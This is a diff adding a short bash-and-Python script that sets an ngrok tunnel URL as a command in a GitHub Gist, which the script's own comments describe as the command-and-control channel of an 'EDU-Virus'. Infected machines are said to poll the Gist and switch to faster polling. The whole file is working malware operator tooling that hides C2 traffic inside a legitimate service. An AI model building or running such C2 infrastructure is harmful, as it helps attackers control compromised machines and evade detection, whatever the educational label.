@@ -1,0 +1,52 @@
+#!/bin/bash
+# Set your ngrok URL so the virus switches to fast polling
+# Usage: ./set-ngrok https://abc123.ngrok-free.app
+
+if [ $# -ne 1 ]; then
+    echo "Usage: $0 <ngrok_url>"
+    echo "  ./set-ngrok https://abc123.ngrok-free.app"
+    exit 1
+fi
+
+URL="$1"
+# Remove trailing slash
+URL="${URL%/}"
+
+echo "Setting ngrok URL to: $URL"
+
+python3 -c "
+import json, subprocess, os
+
+url = '$URL'
+cmd_id = str(int(os.times()[0] * 10000))
+payload = {
+    'description': 'EDU-Virus C2 - ngrok: ' + url,
+    'files': {
+        'c2_command.txt': {
+            'content': json.dumps({
+                'cmd': 'set_ngrok',
+                'args': [url],
+                'id': cmd_id
+            })
+        }
+    }
+}
+
+import tempfile
+tmp = os.path.join(tempfile.gettempdir(), 'gist_ngrok.json')
+with open(tmp, 'w') as f:
+    json.dump(payload, f)
+
+result = subprocess.run(
+    ['gh', 'api', '-X', 'PATCH', 'gists/99a46fc04b180fffdafc03584c0d5a2e',
+     '--input', tmp, '--jq', '.files[\"c2_command.txt\"].content'],
+    capture_output=True, text=True, timeout=15
+)
+os.unlink(tmp)
+
+if result.returncode == 0:
+    print(f'✓ ngrok URL set in Gist!')
+    print(f'  Virus will pick this up within 15s and switch to fast (5s) polling.')
+else:
+    print(f'✗ Failed: {result.stderr}')
+"
